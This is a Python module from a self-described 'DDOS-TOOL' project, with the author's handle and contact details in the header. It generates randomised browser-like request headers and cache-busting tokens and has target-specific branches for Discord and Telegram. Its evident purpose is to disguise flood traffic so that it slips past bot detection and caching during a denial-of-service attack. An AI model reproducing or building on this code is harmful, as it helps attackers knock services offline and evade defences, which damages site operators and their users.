"""
DDOS-TOOL

Author / Developer / Admin / Owner: Aashu
GitHub:  @outwiles
Telegram: @outwiles
Email:   outwiles@proton.me

License: MIT
"""

import random
import string

from .ua_pool import pick_ua, pick_lang, pick_encoding, pick_referer


def _rand_token(n: int = 12) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def build_headers(target_type: str = "http", host: str | None = None) -> dict:
    headers = {
        "User-Agent": pick_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": pick_lang(),
        "Accept-Encoding": pick_encoding(),
        "Referer": pick_referer(),
        "Connection": random.choice(["keep-alive", "close"]),
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": random.choice(["document", "empty"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "Pragma": "no-cache",
        "DNT": random.choice(["1", "0"]),
        "X-Request-Id": _rand_token(16),
        "X-Client-Trace": _rand_token(10),
    }

    if host:
        headers["Host"] = host

    if target_type == "discord":
        headers["Content-Type"] = "application/json"
        headers["X-RateLimit-Precision"] = "millisecond"
    elif target_type == "telegram":
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    return headers


def cache_buster() -> str:
    return _rand_token(10)
